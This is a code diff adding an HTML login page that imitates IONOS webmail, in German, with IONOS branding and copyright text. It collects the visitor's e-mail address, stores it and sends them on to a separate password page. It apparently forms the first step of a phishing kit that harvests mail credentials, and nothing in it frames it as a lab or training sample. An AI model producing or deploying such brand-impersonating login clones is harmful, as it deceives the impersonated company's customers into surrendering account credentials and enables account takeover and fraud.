@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <title>Webmail Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<!-- HEADER -->
+<header class="topbar">
+  <div class="left">
+    <img src="assets/logo.png" class="logo">
+    <span class="brand">WEBMAIL LOGIN</span>
+  </div>
+</header>
+
+<!-- MAIN CONTENT -->
+<main class="container">
+
+  <div class="card">
+
+    <!-- TITLE SECTION (IMAGE LEFT, TEXT RIGHT) -->
+    <div class="title-section">
+
+      <!-- IMAGE LEFT -->
+      <div class="title-left">
+        <img src="assets/heroindex.png" class="hero-img">
+      </div>
+
+      <!-- TEXT RIGHT -->
+      <div class="title-right">
+        <h1>Mein Webmail Login</h1>
+      </div>
+
+    </div>
+
+    <!-- FORM SECTION -->
+    <div class="form-section">
+
+      <label>E-Mail-Adresse</label>
+      <input type="text" id="studentEmail" placeholder="Email-Adresse eingeben">
+
+      <button onclick="nextStep()">Weiter</button>
+
+      <!-- CUSTOM TEXT BELOW BUTTON -->
+      <p class="small-note">
+        Noch kein IONOS Kunde?
+      </p>
+
+      <p class="call-us">
+        Jetzt Kunde werden und von unseren Angeboten profitieren.
+      </p>
+
+    </div>
+
+  </div>
+
+ <!-- PRODUCTS / FEATURES SECTION -->
+<section class="products">
+
+  <h2>Schnellzugriff auf weitere Logins</h2>
+
+  <div class="product-grid">
+
+    <div class="product-card">
+      <img src="assets/product1.png" class="product-img">
+    </div>
+
+    <div class="product-card">
+      <img src="assets/product2.png" class="product-img">
+    </div>
+
+    <div class="product-card">
+      <img src="assets/product3.png" class="product-img">
+    </div>
+
+  </div>
+
+</section>
+
+</main>
+
+<!-- FOOTER -->
+<footer class="footer">
+
+  <div class="footer-left">
+    <span class="green-dot"></span>
+    Alle Systeme funktional
+  </div>
+
+  <div class="footer-center">
+    © 2026 IONOS SE
+  </div>
+
+  <div class="footer-right">
+    Impressum - Datenschutz - AGB
+  </div>
+
+</footer>
+
+<!-- SCRIPT -->
+<script>
+function nextStep() {
+  const studentEmail = document.getElementById("studentEmail").value;
+
+  if (!studentEmail) {
+    alert("Bitte geben Sie Ihre E-Mail-Adresse ein");
+    return;
+  }
+
+  localStorage.setItem("studentEmail", studentEmail);
+
+  window.location.href = "password.html";
+}
+</script>
+
+</body>
+</html>
+
